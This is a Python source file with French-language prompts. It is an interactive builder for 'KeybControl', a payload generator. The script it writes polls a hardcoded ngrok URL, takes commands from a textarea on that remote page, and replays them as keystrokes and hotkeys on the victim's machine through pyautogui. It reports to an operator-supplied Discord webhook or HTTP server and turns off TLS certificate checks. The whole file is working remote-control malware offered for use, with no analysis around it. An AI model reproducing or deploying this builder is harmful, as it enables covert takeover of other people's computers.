import os
from colorama import Fore, Style

def clear():
    os.system("cls")

def affichage():
    clear()
    print(f"""

          {Fore.YELLOW}Options :    
          {Fore.WHITE}

{Fore.YELLOW}
    Sortie et envoi :
  {Fore.WHITE}  
    1. Webhook Discord
    2. Serveur HTTP
{Fore.GREEN}

    Tapez : set <num> pour configurer
    Tapez : show pour afficher la config
    Tapez : create pour générer
    Tapez : exit pour quitter
""")
    
def keybcontrol():
    clear()
    choix = {
        "Webhook Discord": None,
        "URL Serveur HTTP": None
    }

    def webhook_option():
        clear()
        webhook = input("Entrez le Webhook Discord : ")
        choix["Webhook Discord"] = webhook
        affichage()

    def http_option():
        clear()
        url = input("Entrez l'URL du serveur HTTP : ")
        choix["URL Serveur HTTP"] = url
        affichage()

    option_funcs = {
        1: webhook_option,
        2: http_option
    }

    def create_payload():
        clear()
        print("[+] === Payload KeybControl Généré ===\n")
        payload = f"""
import requests
from bs4 import BeautifulSoup
import pyautogui
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time

site = "https://nonreversing-dulcie-dashingly.ngrok-free.dev/"
"""

        if choix["Webhook Discord"]:
            payload += f"""
webhook_url = "{choix['Webhook Discord']}"
"""
        if choix["URL Serveur HTTP"]:
            payload += f"""
http_url = "{choix['URL Serveur HTTP']}"
"""
    
        payload += """
test = requests.get(site, verify=False)


mapping = {
    "ctrl": "ctrl",
    "maj": "shift",
    "shift": "shift",
    "alt": "alt",
    "win": "win",
    "enter": "enter"
}

# touches simples reconnues
touches_simples = ["ctrl", "shift", "alt", "win", "enter", "fn", "delete"]

while True:

##################### Test en ligne #####################
    if test.status_code != 200:
        print(f"Erreur lors de la connexion à {site} : {test.status_code}")"""

        if choix["Webhook Discord"]:
            payload += """

        requests.post(webhook_url, json={"content": f"site : {site} est down"})"""
            
        if choix["URL Serveur HTTP"]:
            payload += """
        requests.post(http_url, json={"content": f"site : {site} est down"})"""
            
        payload += r"""


############ NE PAS S'EN OCCUPER #####################
    response = requests.get(site, verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    champ = soup.find("textarea", {"id": "texte"})
######################################################

    if not champ:
        continue

    texte = champ.get_text()

    if not texte:
        continue

    lignes = texte.split("\n")

    for ligne in lignes:
        ligne = ligne.strip().lower()

        if not ligne:
            continue

        if " " in ligne and any(k in ligne for k in mapping):
            touches = ligne.split()
            touches = [mapping.get(t, t) for t in touches]
            pyautogui.hotkey(*touches)

        elif ligne in touches_simples:
            pyautogui.press(mapping.get(ligne, ligne))

        else:
            pyautogui.write(ligne)

        time.sleep(0.3)  

    time.sleep(5)
    """
        payload_path = os.path.join("keybcontrol_payload.py")
        with open(payload_path, "w") as f:
            f.write(payload)

        print(f"Script généré : {payload_path}")

    # 🔁 Boucle principale
    while True:
        try:
            affichage()
            cmd = input(">> ")

            if cmd.lower() == "exit":
                break

            elif cmd.lower().startswith("set "):
                try:
                    option_num = int(cmd.split()[1])
                    if option_num in option_funcs:
                        option_funcs[option_num]()
                    else:
                        print("Numéro d'option invalide.")
                except (IndexError, ValueError):
                    print("Commande invalide.")

            elif cmd.lower() == "show":
                clear()
                print("\nConfiguration actuelle :\n")
                for key, value in choix.items():
                    print(f"{key}: {value}")
                input("\nAppuyez sur Entrée...")

            elif cmd.lower() == "create":
                create_payload()
                input("\nAppuyez sur Entrée...")

            else:
                print("Commande invalide.")

        except Exception as e:
            print(f"Une erreur est survenue : {e}")
            input("\nAppuyez sur Entrée...")
